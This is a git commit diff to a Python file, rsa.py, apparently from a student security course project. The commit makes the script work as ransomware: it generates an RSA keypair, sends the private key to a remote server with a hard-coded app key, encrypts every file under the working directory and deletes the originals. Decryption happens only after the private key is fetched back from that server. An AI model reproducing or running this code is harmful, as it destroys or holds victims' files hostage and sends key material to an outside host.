6042bd1346439574ca54b38d6336dfdc116c18f0
trannick <nicktran29@gmail.com>
2018-12-13 15:16:57 -0800

    final

--- rsa.py
+++ rsa.py
@@ -1,6 +1,7 @@
 import os 
 import json
 import base64
+import requests
 
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
@@ -10,9 +11,9 @@ from cryptography.hazmat.primitives import hashes, hmac
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives import serialization
 
-testpath='/home/nick/Downloads/378/text.txt'
+#testpath='/home/nick/Downloads/378/text.txt'
 #directory = '/home/nick/Downloads/378/asdf'
-projectPath = '/home/nick/Downloads/378/Project378'
+#projectPath = '/home/nick/Downloads/378/Project378'
 
 def RSAKeyGen():
     pemFiles=[]
@@ -27,9 +28,9 @@ def RSAKeyGen():
             headline = pemFile.read()
             pemFile.close()
 
-            if "PRIVATE" in headline:
-                privateKeyPath = filePath + "/" + pemFiles[i]
-            elif "PUBLIC" in headline:
+            # if "PRIVATE" in headline:
+            #     privateKeyPath = filePath + "/" + pemFiles[i]
+            if "PUBLIC" in headline:
                 publicKeyPath = filePath + "/" + pemFiles[i]
     else:
         privKey = rsa.generate_private_key(
@@ -48,18 +49,27 @@ def RSAKeyGen():
             format=serialization.PublicFormat.SubjectPublicKeyInfo
         )
 
-        privatePem=open("private.pem", 'wb')
-        privatePem.write(privateKeyPem)
-        privatePem.close()
-
         publicPem=open('public.pem', 'wb')
         publicPem.write(publicKeyPem)
-        privatePem.close()
+        publicPem.close()
 
-        privateKeyPath=filePath + "/private.pem"
-        publicKeyPath=filePath + "/public.pem"
-        
-    return privateKeyPath, publicKeyPath
+        privateKey = base64.encodebytes(privateKeyPem).decode('ascii')
+        publicKey = base64.encodebytes(publicKeyPem).decode('ascii')
+
+        privateKey = privateKey.replace("\n", "*")
+        publicKey = publicKey.replace("\n", "*")
+
+        url = 'https://www.378dn.me'
+        request = url + '/keypair'
+        headers = {'appkey': '378dnsecurity'}
+        keyData = {'privatekey': privateKey, 'publickey': publicKey}
+
+        print("Sending keys to server..")
+        response = requests.post(request, headers = headers, data = keyData)
+        print(response.json())
+        publicKeyPath=filePath + "/public.pem"        
+    return publicKeyPath
+
 
 def myEncrypt(key, text):
     if len(key)<32:
@@ -177,9 +187,33 @@ def MyRSADecrypt(RSACipher, C, IV, tag, ext, RSA_Privatekey_path, filePath):
                 label=None
             )
         )
-        plainText=myFileDecryptMAC(filePath, C, IV, combinedKeys[:32], combinedKeys[32:64], tag)
-    
+        #plainText=myFileDecryptMAC(filePath, C, IV, combinedKeys[:32], combinedKeys[32:64], tag)
+        plainText = myDecryptMAC( combinedKeys[:32], IV, C, combinedKeys[32:64], tag)
+
     return plainText
+
+def getPrivatePath(directory, publicPath):
+    publicKeyFile = open(publicPath, 'rb')
+    print("Retrieving keys..")
+    publicKey = publicKeyFile.read()
+    publicKey = base64.encodebytes(publicKey).decode('ascii')
+    publicKey = publicKey.replace("\n", "*")
+    headers = {'publickey': publicKey, 'appkey': '378dnsecurity'}
+    url = 'https://378dn.me'
+    request = url + '/private'
+    response = requests.get(request, headers = headers)
+    
+    privateKeyJson = response.json()
+    privateKey=privateKeyJson['privatekey'].replace('*', '\n')
+
+    privateKeyDecoded = base64.decodebytes(privateKey.encode('ascii'))
+
+    privateKeyFile = open('private.pem', 'wb')
+    privateKeyFile.write(privateKeyDecoded)
+    privateKeyFile.close()
+    privatePath = directory +'/private.pem'
+    
+    return privatePath
 
 def EncryptAll(directory, publicPath):
     for root, dirs, filesToEncrypt in os.walk(directory):
@@ -190,13 +224,9 @@ def EncryptAll(directory, publicPath):
 
                 fileName=os.path.splitext(fileDirectory)[0] +".json"
 
-               # btsCiphertext = base64.encodebytes(c)
                 encodedCiphertext = base64.encodebytes(c).decode('ascii')
-               # btsEncryptedKeys = base64.encodebytes(RSACipher)
                 encodedEncryptedKeys = base64.encodebytes(RSACipher).decode('ascii')
-                #btsHMACTag = base64.encodebytes(tag)
                 encodedHMACTag = base64.encodebytes(tag).decode('ascii')
-                #btsIV = base64.encodebytes(iv)
                 encodedIV = base64.encodebytes(iv).decode('ascii')
 
                 jsonObj={"RSA Cipher: " : encodedEncryptedKeys, "Ciphertext: " : encodedCiphertext, "IV: " : encodedIV, "Tag: " : encodedHMACTag, "Extension: " : ext}
@@ -204,49 +234,38 @@ def EncryptAll(directory, publicPath):
                 jsonFile=json.dumps(jsonObj)
                 jsonOutput=open(fileName, 'w')
                 jsonOutput.write(jsonFile)
-                os.remove(directory+"/"+files)
+                os.remove(fileDirectory)
 
 def DecryptAll(directory, privatePath):
-    #os.chdir(directory)
     for root, dirs, filesToDecrypt in os.walk(directory):
         for files in filesToDecrypt:
             if files.endswith(".json"):
-                jsonInput = open(files, "r")
+                jsonFilePath = root + "/" + files
+                jsonInput = open(jsonFilePath, "r")
                 jsonData = jsonInput.read()
 
                 jsonObj = json.loads(jsonData)
 
-                #stbCiphertext = jsonObj["Ciphertext: "].encode('ascii')
-                decodedCiphertext = base64.decodebytes(stbCiphertext)
-                #stbEncryptedKeys = jsonObj["RSA Cipher: "].encode('ascii')
-                decodedEncryptedKeys = base64.decodebytes(stbEncryptedKeys)
-                #stbHMACTag = jsonObj["Tag: "].encode('ascii')
-                decodedHMACTag = base64.decodebytes(stbHMACTag)
-                #stbIV = jsonObj["IV: "].encode('ascii')
-                decodedIV = base64.decodebytes(stbIV)
+                decodedCiphertext = base64.decodebytes(jsonObj["Ciphertext: "].encode('ascii'))
+                decodedEncryptedKeys = base64.decodebytes(jsonObj["RSA Cipher: "].encode('ascii'))
+                decodedHMACTag = base64.decodebytes(jsonObj["Tag: "].encode('ascii'))
+                decodedIV = base64.decodebytes(jsonObj["IV: "].encode('ascii'))
                 ext = jsonObj["Extension: "]
 
                 plaintext = MyRSADecrypt(decodedEncryptedKeys, decodedCiphertext, decodedIV, decodedHMACTag, ext, privatePath, files)
                 filePath=os.path.splitext(root+"/"+files)[0] + ext
                 fileOut=open(filePath, 'wb')
                 fileOut.write(plaintext)
-                os.remove(files)
-        # print(os.path.dirname(directory))
-        # print(directory)
-        # print(files)
-    #print("hello")
+                os.remove(jsonFilePath)
 
 def main():
-    (privatePath, publicPath) = RSAKeyGen()
-    print("private path ", privatePath)
-    print("public path", publicPath)
-    # (RSACipher, C, IV, tag, ext) = MyRSAEncrypt(path, publicPath)
-    # text=MyRSADecrypt(RSACipher, C, IV, tag, ext, privatePath, path)
+    publicPath = RSAKeyGen()
     path1=os.getcwd()
-    print(path1)
-    # EncryptAll(path1, publicPath)
-    # x = input("Enter something to continue: ")
-    # DecryptAll(path1, privatePath)
-
+    EncryptAll(path1, publicPath)
+    x = input("Enter something to continue: ")
+    privatePath = getPrivatePath(path1, publicPath)
+    DecryptAll(path1, privatePath)
+    os.remove(publicPath)
+    os.remove(privatePath)
     
 main()
